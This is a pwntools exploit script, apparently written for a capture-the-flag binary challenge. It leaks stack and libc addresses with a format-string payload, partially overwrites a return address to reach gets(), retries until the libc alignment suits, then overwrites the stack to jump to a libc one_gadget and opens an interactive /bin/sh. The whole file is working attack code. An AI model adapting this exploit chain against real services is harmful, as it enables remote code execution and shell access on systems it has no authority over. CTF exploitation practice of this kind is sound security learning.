#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+75
'''.format(**locals())

# Set up pwntools for the correct files
exe = './vuln_patched'
elf = context.binary = ELF(exe)

libc = elf.libc

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# NOTE: PLEASE run pwninit on the executable first! The challenge provides no linker and RUNPATH is not set on the executable.

while True:
    io = start()
    libc = elf.libc

    # Step 1: Leak stack, libc address
    #         Overwrite the first 3 bytes of the return address to gets()

    io.send(flat(
        b"AAAAAAAA %43$p %59$p AAA",
        b"A" * 240,
        b"\xa0\x05\x88"  # first 3 bytes of gets
    ))

    try:
        io.recvuntil(b"AAAAAAAA ")
    except EOFError:
        print("Errored! Sleep for 1 second.")
        io.close()
        sleep(1)
        continue

    stack_addr = int(io.recvuntil(b" ", drop=True), 16)
    libc.address = int(io.recvuntil(b" ", drop=True), 16) - \
        (libc.symbols["__libc_start_main"] + 128)

    print(
        f"Stack address: {hex(stack_addr)} | Libc address: {hex(libc.address)}")

    if hex(libc.address)[-6:] == "800000":
        print("WE GOT IT")
        break

    io.close()

# Step 2: Payload for gets()

# Lucky we can control rbp, r13 and r12

# 0xebd52 execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# r12 8944
# r13 8952
# rbp 8936
# ret 8976
io.sendline(flat(
    b"\x00" * 8936,
    stack_addr,  # fake rbp
    b"\x00" * (8976 - 8936 - 8),
    libc.address + 0xebd52  # one_gadget
))

io.interactive()
